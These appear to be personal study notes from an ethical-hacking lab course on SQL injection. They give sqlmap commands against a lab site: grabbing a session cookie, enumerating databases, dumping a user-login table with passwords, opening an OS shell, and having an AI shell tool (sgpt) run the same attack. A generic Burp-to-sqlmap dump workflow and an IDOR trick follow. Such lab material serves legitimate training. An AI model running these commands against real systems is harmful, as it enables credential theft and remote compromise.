 2025-08-06 21:46

Status:

Tags:

# SQL injection
Structured Query Language (SQL) is a textual language used by a database server. SQL commands used to perform operations on the database include ``INSERT, SELECT, UPDATE, and DELETE``. These commands are used to manipulate data in the database server.

SQL injection is a technique used to take advantage of un-sanitized input vulnerabilities to pass SQL commands through a web application for execution by a backend database
-  SQL injection is a basic attack used to either gain unauthorized access to a database or retrieve information directly from the database 
- It is a flaw in web applications and not a database or web server issue 
- [ ] do theory 
# Lab 1: Perform SQL Injection Attacks
## Task 1: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap

-  open parrot 
1. visit ``http://www.moviescope.com`` 
	- login as ``sam:test``
2. click view profile 
	- inspect the page -> console 
	- type ``document.cookie  `` 
	- copy cookie 
3. run SQLmap
	- ``sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="A[cookie value that you copied in Step#7]" --dbs ``
	- type y for **Do you want to skip test payloads**
4. you need to choose a database and use sqlmap to retrieve the tables in the database
	- ``sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables``
5.  you need to retrieve the table content of the column **User_Login**.
	- ``sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump ``
	- this will give you users list and their passwords 
6. to get shell 
		- `` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell ``  type y
	- to get host info 
		- ``hostname ``
	- to view a list of tasks that are currently running on the target system.
		- ``TASKLIST ``
	- to view what else command you perform 
		- ``help ``

# Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools

## Task 1: Detect SQL Injection Vulnerabilities using OWASP ZAP

- open windows server 2019 and search zap 
1. start **OWASP ZA**
2. select **Automated Scan**
3. enter http://www.moviescope.com
4. under alert see SQL injection 
5. and MS SQL 
	- done  


# Lab 3: Perform SQL Injection using AI
1. `` **sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the DBMS databases"** ``
2. ``sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the tables pertaining to moviescope database"``
3. ``sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and retrieve User_Login table contents from moviescope database"```
## Exploit the web application (page_id)
1. nmap -sV --script=http-enum [target domain or IP address]
2. Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap. 
3. Now open the burp and check the input parameters and intercept on then type some as`` `` “1 OR ANY TEXT”`` you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
4.  ``sqlmap -r <txt file from burpsuite> --dbs`` 
5.    `` sqlmap -r <txt file from burpsuite> -D <database name> --tables``
6. ``sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns``
7. ``sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all ``
8. ``then login and do the url parameter change page_id=1 to page_id=84 ``

- [ ]  make notes for using AI sql  
      

### References
